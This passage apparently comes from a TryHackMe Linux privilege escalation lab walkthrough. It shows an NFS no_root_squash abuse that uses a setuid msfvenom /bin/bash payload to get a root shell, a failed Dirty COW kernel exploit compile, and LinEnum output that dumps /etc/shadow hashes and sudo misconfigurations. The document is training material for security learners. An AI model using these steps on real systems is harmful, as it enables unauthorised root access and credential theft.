Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# exit
logout
Connection to 10.65.167.239 closed.

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ 
```

---------------------------------------------------------------------------------------

### Task 19: NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

Note that the **/tmp** share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

`mkdir /tmp/nfs`  
`mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

Still using Kali's root user, make the file executable and set the SUID permission:

chmod +xs /tmp/nfs/shell.elf

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### What is the name of the option that disables root squashing?

Check the NFS share configuration

```bash
user@debian:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

#/tmp *(rw,sync,insecure,no_subtree_check)

user@debian:~$ 
```

At our Kali machine, mount the share as root and create a shell binary in it

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ sudo su                                                                                          
[sudo] password for kali: 
┌──(root㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─# mkdir /tmp/nfs                             

┌──(root㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─# mount -o rw,vers=3 10.65.167.239:/tmp /tmp/nfs
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.

┌──(root㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─# cd /tmp/nfs       

┌──(root㉿kali)-[/tmp/nfs]
└─# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf  
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of elf file: 132 bytes
Saved as: shell.elf

┌──(root㉿kali)-[/tmp/nfs]
└─# ls -l shell.elf 
-rw-r--r-- 1 root root 132 Feb 14 12:55 shell.elf

┌──(root㉿kali)-[/tmp/nfs]
└─# chmod +xs shell.elf

┌──(root㉿kali)-[/tmp/nfs]
└─# ls -l shell.elf    
-rwsr-sr-x 1 root root 132 Feb 14 12:55 shell.elf

┌──(root㉿kali)-[/tmp/nfs]
└─# 
```

Use the shell binary at the Debian machine to become root

```bash
user@debian:/home/user$ ls -l /tmp/shell.elf 
-rwsr-sr-x 1 root root 132 Feb 14 06:55 /tmp/shell.elf
user@debian:/home/user$ /tmp/shell.elf       
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# rm /tmp/shell.elf 
bash-4.1# exit
exit
user@debian:/home/user$ 
```

---------------------------------------------------------------------------------------

### Task 20: Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at `/home/user/tools/kernel-exploits/dirtycow/c0w.c`. It replaces the SUID file `/usr/bin/passwd` with one that spawns a shell (a backup of `/usr/bin/passwd` is made at `/tmp/bak`).

Compile the code and run it (note that it may take several minutes to complete):

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`  
`./c0w`

Once the exploit completes, run `/usr/bin/passwd` to gain a root shell:

`/usr/bin/passwd`

Remember to restore the original `/usr/bin/passwd` file and exit the root shell before continuing!

`mv /tmp/bak /usr/bin/passwd`  
`exit`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Check for exploit suggestions

```bash
user@debian:/home/user$ cd tools/kernel-exploits/
user@debian:/home/user/tools/kernel-exploits$ ls -l
total 8
drwxr-xr-x 2 user user 4096 May 15  2020 dirtycow
drwxr-xr-x 2 user user 4096 Jan 14  2020 linux-exploit-suggester-2
user@debian:/home/user/tools/kernel-exploits$ cd linux-exploit-suggester-2/
user@debian:/home/user/tools/kernel-exploits/linux-exploit-suggester-2$ ls -l
total 52
-rw-r--r-- 1 user user 18060 Jan 14  2020 LICENSE
-rw-r--r-- 1 user user  2292 Jan 14  2020 README.md
-rwxr-xr-x 1 user user 24783 Jan 14  2020 linux-exploit-suggester-2.pl
user@debian:/home/user/tools/kernel-exploits/linux-exploit-suggester-2$ perl linux-exploit-suggester-2.pl 

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024

user@debian:/home/user/tools/kernel-exploits/linux-exploit-suggester-2$ 
```

Try to compile the exploit

```bash
user@debian:/home/user/tools/kernel-exploits/dirtycow$ gcc -pthread c0w.c -o c0w
In file included from /usr/include/bits/fcntl.h:24,
                 from /usr/include/fcntl.h:34,
                 from c0w.c:20:
/usr/include/sys/types.h:147:20: error: stddef.h: No such file or directory
In file included from /usr/include/sched.h:35,
                 from /usr/include/pthread.h:25,
                 from c0w.c:21:
/usr/include/bits/sched.h:198: error: expected ')' before '__setsize'
/usr/include/bits/sched.h:200: error: expected ')' before '__count'
In file included from /usr/include/pthread.h:26,
                 from c0w.c:21:
/usr/include/time.h:199: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strftime'
In file included from /usr/include/pthread.h:26,
                 from c0w.c:21:
/usr/include/time.h:217: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strftime_l'
In file included from c0w.c:21:
/usr/include/pthread.h:299: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/pthread.h:300: error: nonnull argument with out-of-range operand number (argument 1, operand 2)
/usr/include/pthread.h:304: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/pthread.h:363: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/pthread.h:364: error: nonnull argument with out-of-range operand number (argument 1, operand 2)
/usr/include/pthread.h:370: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/pthread.h:377: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/pthread.h:378: error: nonnull argument with out-of-range operand number (argument 1, operand 3)
/usr/include/pthread.h:384: error: expected declaration specifiers or '...' before 'size_t'
In file included from c0w.c:22:
/usr/include/string.h:44: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:48: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:57: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:64: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:67: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:94: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:131: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:139: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:145: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:152: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strxfrm'
/usr/include/string.h:167: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strxfrm_l'
/usr/include/string.h:181: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:282: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strcspn'
/usr/include/string.h:286: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strspn'
/usr/include/string.h:397: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strlen'
/usr/include/string.h:404: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'strnlen'
/usr/include/string.h:425: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:449: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:453: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:457: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:460: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:538: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:575: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/string.h:578: error: expected declaration specifiers or '...' before 'size_t'
In file included from /usr/include/stdio.h:75,
                 from c0w.c:23:
/usr/include/libio.h:53:21: error: stdarg.h: No such file or directory
In file included from /usr/include/stdio.h:75,
                 from c0w.c:23:
/usr/include/libio.h:332: error: expected specifier-qualifier-list before 'size_t'
/usr/include/libio.h:364: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/libio.h:373: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/libio.h:491: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/libio.h:493: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/libio.h:495: error: expected '=', ',', ';', 'asm' or '__attribute__' before '_IO_sgetn'
In file included from c0w.c:23:
/usr/include/stdio.h:296: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:302: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:314: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:321: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:349: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:354: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:357: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:363: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:365: error: format string argument not a string type
/usr/include/stdio.h:367: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:368: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:369: error: format string argument not a string type
/usr/include/stdio.h:395: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:454: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:461: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:466: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:476: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:481: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:484: error: expected declaration specifiers or '...' before '__gnuc_va_list'
/usr/include/stdio.h:639: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:642: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:652: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/stdio.h:682: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'fread'
/usr/include/stdio.h:688: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'fwrite'
/usr/include/stdio.h:710: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'fread_unlocked'
/usr/include/stdio.h:712: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'fwrite_unlocked'
In file included from c0w.c:25:
/usr/include/sys/mman.h:58: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:77: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:82: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:90: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:95: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:99: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:104: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:107: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/sys/mman.h:124: error: expected declaration specifiers or '...' before 'size_t'
In file included from /usr/include/signal.h:356,
                 from /usr/include/sys/wait.h:31,
                 from c0w.c:28:
/usr/include/bits/sigstack.h:54: error: expected specifier-qualifier-list before 'size_t'
In file included from c0w.c:30:
/usr/include/unistd.h:357: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:363: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:507: error: expected declaration specifiers or '...' before 'size_t'
In file included from c0w.c:30:
/usr/include/unistd.h:618: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'confstr'
/usr/include/unistd.h:790: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:826: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:837: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:873: error: expected declaration specifiers or '...' before 'size_t'
In file included from c0w.c:30:
/usr/include/unistd.h:895: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:902: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:913: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:915: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:933: error: expected declaration specifiers or '...' before 'size_t'
/usr/include/unistd.h:934: error: expected declaration specifiers or '...' before 'size_t'
c0w.c: In function 'madviseThread':
c0w.c:85: error: too many arguments to function 'madvise'
c0w.c: In function 'main':
c0w.c:108: error: too many arguments to function 'mmap'
user@debian:/home/user/tools/kernel-exploits/dirtycow$ 
```

Failure :-(

The reasons seems to be [mismatching versions](https://stackoverflow.com/questions/31600600/compilation-error-stddef-h-no-such-file-or-directory#32410193).

---------------------------------------------------------------------------------------

### Task 21: Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Linux.

Three of these tools have been included on the Debian VM in the following directory: `/home/user/tools/privesc-scripts`

---------------------------------------------------------------------------------------

#### Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?

The three tools are:

```bash
user@debian:/home/user/tools/privesc-scripts$ ls -l
total 312
-rwxr-xr-x 1 user user  46631 May 15  2020 LinEnum.sh
-rwxr-xr-x 1 user user 223835 May 15  2020 linpeas.sh
-rwxr-xr-x 1 user user  37251 May 15  2020 lse.sh
user@debian:/home/user/tools/privesc-scripts$
```

**LinEnum.sh** execution:

```bash
user@debian:/home/user/tools/privesc-scripts$ ./LinEnum.sh 

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Sat Feb 14 07:38:28 EST 2026                                                                                                                                                                                 
                                                                                                                                                                                                             

### SYSTEM ##############################################
[-] Kernel information:
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014


[-] Hostname:
debian


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
root             pts/1    ip-192-168-144-7 Sat Feb 14 06:44:46 -0500 2026
newroot          pts/1    ip-192-168-144-7 Sat Feb 14 06:44:46 -0500 2026
user             pts/0    ip-192-168-144-7 Sat Feb 14 03:42:23 -0500 2026


[-] Who else is logged on:
 07:38:28 up  4:15,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/0    ip-192-168-144-7 03:42    2.00s  0.17s  0.00s /bin/bash ./Lin


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(Debian-exim) gid=103(Debian-exim) groups=103(Debian-exim)
uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
uid=103(statd) gid=65534(nogroup) groups=65534(nogroup)
uid=104(mysql) gid=106(mysql) groups=106(mysql)


[+] It looks like we have password hashes in /etc/passwd!
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
newroot:wA9PdBLNI5zuY:0:0:newroot:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
statd:x:103:65534::/var/lib/nfs:/bin/false
mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false


[+] We can read the shadow file!
root:$6$7f9n5vRK/uU$eCSSW8NqxeXcYgsCVLAGg5T6GN7fXOV5vOArX3jg0xZR1GXIEdjohL3/vQZjvF0Bz3y..XsEvdguLddxfK/bq.:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::


[-] Super user account(s):
root
newroot


[+] We can sudo without supplying a password!
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more


[+] Possible sudo pwnage!
/usr/sbin/iftop
/usr/bin/find
/usr/bin/nano
/usr/bin/vim
/usr/bin/man
/usr/bin/awk
/usr/bin/less
/usr/bin/ftp
/usr/bin/nmap
/bin/more


[-] Are permissions on /home directories lax:
total 12K
drwxr-xr-x  3 root root 4.0K May 15  2017 .
drwxr-xr-x 22 root root 4.0K Aug 25  2019 ..
drwxr-xr-x  6 user user 4.0K Feb 14 06:14 user


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
HISTSIZE=1000000
HISTFILESIZE=1000000
PWD=/home/user/tools/privesc-scripts
SHLVL=3
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
drwxr-xr-x 2 root root   4096 Aug 25  2019 /bin
drwxr-xr-x 2 root root   4096 May 13  2017 /sbin
drwxr-xr-x 2 root root  20480 May 15  2020 /usr/bin
drwxrwsr-x 2 root staff  4096 May 14  2017 /usr/local/bin
drwxrwsr-x 2 root staff  4096 May 12  2017 /usr/local/sbin
drwxr-xr-x 2 root root   4096 May 15  2020 /usr/sbin


[-] Available shells:
# /etc/shells: valid login shells
/bin/csh
/bin/sh
/usr/bin/es
/usr/bin/ksh
/bin/ksh
/usr/bin/rc
/usr/bin/tcsh
/bin/tcsh
/usr/bin/esh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK           022


[-] Password and storage information:
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  804 May 13  2017 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May 15  2020 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder
-rw-r--r--  1 root root  607 Oct 17  2009 john

/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 May 13  2017 .
drwxr-xr-x 67 root root  4096 Feb 14 07:24 ..
-rw-r--r--  1 root root   102 Dec 18  2010 .placeholder
-rwxr-xr-x  1 root root   633 Jul 28  2015 apache2
-rwxr-xr-x  1 root root 14799 Apr 15  2011 apt
-rwxr-xr-x  1 root root   314 Aug 10  2011 aptitude
-rwxr-xr-x  1 root root   502 Jun 17  2010 bsdmainutils
-rwxr-xr-x  1 root root   256 Jun  5  2014 dpkg
-rwxr-xr-x  1 root root  4109 Oct 25  2012 exim4-base
-rwxr-xr-x  1 root root  2211 Oct 26  2010 locate
-rwxr-xr-x  1 root root    89 Apr 17  2010 logrotate
-rwxr-xr-x  1 root root  1335 Jan  2  2011 man-db
-rwxr-xr-x  1 root root   249 Feb 15  2011 passwd
-rwxr-xr-x  1 root root  3594 Dec 18  2010 standard

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 May 12  2017 .
drwxr-xr-x 67 root root 4096 Feb 14 07:24 ..
-rw-r--r--  1 root root  102 Dec 18  2010 .placeholder
-rwxr-xr-x  1 root root  895 Jan  2  2011 man-db


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh


### NETWORKING  ##########################################
[-] Network and IP info:
eth0      Link encap:Ethernet  HWaddr 0e:2c:39:2f:4f:f5  
          inet addr:10.65.167.239  Bcast:10.65.191.255  Mask:255.255.192.0
          inet6 addr: fe80::c2c:39ff:fe2f:4ff5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:6495 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3674 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:477790 (466.5 KiB)  TX bytes:2159039 (2.0 MiB)
          Interrupt:20 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:8756 (8.5 KiB)  TX bytes:8756 (8.5 KiB)


[-] ARP history:
ip-10-65-128-1.ec2.internal (10.65.128.1) at 0e:1b:25:8a:6f:21 [ether] on eth0


[-] Nameserver(s):
nameserver 10.65.0.2


[-] Default route:
default         ip-10-65-128-1. 0.0.0.0         UG    0      0        0 eth0


[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:42322           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:33685           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:35303           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               


[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 127.0.0.1:744           0.0.0.0:*                           -               
udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
udp        0      0 0.0.0.0:43768           0.0.0.0:*                           -               
